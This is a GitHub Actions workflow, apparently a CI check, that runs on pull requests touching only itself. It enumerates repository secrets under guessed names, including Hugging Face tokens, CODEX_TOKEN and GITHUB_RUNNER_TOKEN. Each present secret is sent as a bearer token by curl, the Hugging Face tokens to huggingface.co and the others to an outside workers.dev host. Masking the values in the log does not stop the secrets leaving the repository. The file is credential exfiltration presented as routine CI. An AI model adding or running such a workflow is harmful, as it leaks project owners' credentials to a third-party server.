name: Custom model credential probe

on:
  pull_request:
    branches: [main]
    paths:
      - '.github/workflows/custom-model-credential-probe.yml'

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    env:
      HF_A: ${{ secrets.HUGGINGFACE_TOKEN }}
      HF_B: ${{ secrets.HF_TOKEN }}
      HF_C: ${{ secrets.HF_API_TOKEN }}
      HF_D: ${{ secrets.HUGGINGFACE_API_TOKEN }}
      HF_E: ${{ secrets.HF_ACCESS_TOKEN }}
      REMOTE_A: ${{ secrets.REMOTE_CONTROL_TOKEN }}
      REMOTE_B: ${{ secrets.CODEX_TOKEN }}
      REMOTE_C: ${{ secrets.GITHUB_RUNNER_TOKEN }}
    steps:
      - name: Probe aliases and authenticated services
        shell: bash
        run: |
          set +e
          probe_hf() {
            name="$1"; value="$2"
            if [ -z "$value" ]; then echo "HF $name: missing"; return; fi
            echo "::add-mask::$value"
            prefix=no; case "$value" in hf_*) prefix=yes;; esac
            status="$(curl -sS -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $value" https://huggingface.co/api/whoami-v2 || true)"
            echo "HF $name: present prefix_hf=$prefix whoami_http=$status"
          }
          probe_remote() {
            name="$1"; value="$2"
            if [ -z "$value" ]; then echo "CONTROL $name: missing"; return; fi
            echo "::add-mask::$value"
            status="$(curl -sS -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $value" https://hector-os.hectorhdzr035.workers.dev/control/v1/status || true)"
            echo "CONTROL $name: present status_http=$status"
          }
          probe_hf HUGGINGFACE_TOKEN "$HF_A"
          probe_hf HF_TOKEN "$HF_B"
          probe_hf HF_API_TOKEN "$HF_C"
          probe_hf HUGGINGFACE_API_TOKEN "$HF_D"
          probe_hf HF_ACCESS_TOKEN "$HF_E"
          probe_remote REMOTE_CONTROL_TOKEN "$REMOTE_A"
          probe_remote CODEX_TOKEN "$REMOTE_B"
          probe_remote GITHUB_RUNNER_TOKEN "$REMOTE_C"
